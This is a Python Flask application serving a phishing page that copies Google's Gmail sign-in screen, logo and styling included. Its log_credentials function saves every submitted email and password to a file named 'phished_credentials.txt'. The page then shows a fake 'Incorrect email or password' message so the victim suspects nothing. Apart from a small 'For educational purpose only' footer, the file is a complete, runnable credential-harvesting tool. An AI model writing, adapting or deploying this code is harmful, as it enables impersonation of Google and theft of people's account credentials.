from flask import Flask, render_template_string, request, redirect, url_for, flash
import os

app = Flask(__name__)
app.secret_key = "your_secret_key"

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign in – Google accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
    <style>
        body {
            background: #fff;
            font-family: 'Roboto', Arial, sans-serif;
            margin: 0;
            padding: 0;
            color: #202124;
        }
        .main {
            width: 100vw;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f5f5;
        }
        .container {
            background: #fff;
            padding: 48px 40px 40px 40px;
            border-radius: 8px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.12);
            width: 360px;
            box-sizing: border-box;
            animation: fadeIn 0.5s ease-out forwards;
            opacity: 0;
            transform: translateY(20px);
        }
        @keyframes fadeIn {
            to { opacity: 1; transform: translateY(0);}
        }
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 32px;
        }
        .logo img {
            width: 92px;
            height: 30px;
        }
        h1 {
            font-size: 26px;
            font-weight: 400;
            margin: 0 0 12px 0;
            color: #202124;
        }
        .subtitle {
            font-size: 15px;
            color: #5f6368;
            margin-bottom: 28px;
        }
        .input-group {
            position: relative;
            margin-bottom: 28px;
        }
        label {
            font-size: 14px;
            color: #5f6368;
            position: absolute;
            top: 16px;
            left: 0;
            pointer-events: none;
            transition: 0.15s ease-in-out;
            background: #fff;
            padding: 0 6px;
        }
        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: -8px;
            left: 2px;
            font-size: 12px;
            color: #1a73e8;
            font-weight: 500;
        }
        input[type=text], input[type=password] {
            width: 100%;
            padding: 16px 10px 8px 10px;
            border: none;
            border-bottom: 1px solid #dadce0;
            font-size: 16px;
            box-sizing: border-box;
            background: #fff;
            outline: none;
            transition: border-color 0.3s ease;
        }
        input[type=text]:focus, input[type=password]:focus {
            border-bottom: 2px solid #1a73e8;
            box-shadow: 0 1px 0 0 #1a73e8;
        }
        .actions {
            display: flex;
            justify-content: flex-end;
            margin-top: 36px;
        }
        input[type=submit] {
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 1px 1px rgba(26,115,232,0.4);
        }
        input[type=submit]:hover {
            background: #1669c1;
            box-shadow: 0 2px 8px rgba(22,105,193,0.6);
        }
        .error {
            color: #d93025;
            font-size: 14px;
            margin-top: 16px;
            text-align: left;
            animation: shake 0.3s;
        }
        @keyframes shake {
            0% { transform: translateX(0);}
            25% { transform: translateX(-6px);}
            50% { transform: translateX(6px);}
            75% { transform: translateX(-6px);}
            100% { transform: translateX(0);}
        }
        .footer {
            position: fixed;
            left: 0;
            bottom: 0;
            font-size: 9px;
            color: #5f6368;
            margin: 8px;
            z-index: 100;
            user-select: none;
        }
        @media (max-width: 400px) {
            .container {
                width: 100vw;
                min-width: 0;
                padding: 32px 16px;
            }
        }
    </style>
</head>
<body>
    <div class="main">
        <form class="container" method="post" autocomplete="off">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
            </div>
            <h1>Sign in</h1>
            <div class="subtitle">to continue to Gmail</div>
            <div class="input-group">
                <input type="text" id="email" name="email" autocomplete="off" required placeholder=" " />
                <label for="email">Email or phone</label>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" autocomplete="off" required placeholder=" " />
                <label for="password">Enter your password</label>
            </div>
            {% with messages = get_flashed_messages(with_categories=true) %}
              {% if messages %}
                {% for category, message in messages %}
                  <div class="{{ category }}">{{ message }}</div>
                {% endfor %}
              {% endif %}
            {% endwith %}
            <div class="actions">
                <input type="submit" value="Next">
            </div>
        </form>
    </div>
    <div class="footer">
        For educational purpose only
    </div>
    <script>
        // Animate label on focus/blur for accessibility
        document.querySelectorAll('.input-group input').forEach(function(input) {
            input.addEventListener('focus', function() {
                this.nextElementSibling.style.color = '#1a73e8';
            });
            input.addEventListener('blur', function() {
                this.nextElementSibling.style.color = this.value ? '#1a73e8' : '#202124';
            });
        });
    </script>
</body>
</html>
"""

def log_credentials(email, password):
    # Save credentials in the project root directory
    root_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    file_path = os.path.join(root_dir, "phished_credentials.txt")
    with open(file_path, "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        if email and password:
            log_credentials(email, password)
            flash("Incorrect email or password.", "error")
            return redirect(url_for("login"))
        else:
            flash("Please enter both email and password.", "error")
            return redirect(url_for("login"))
    return render_template_string(HTML)

if __name__ == "__main__":
    app.run(debug=True)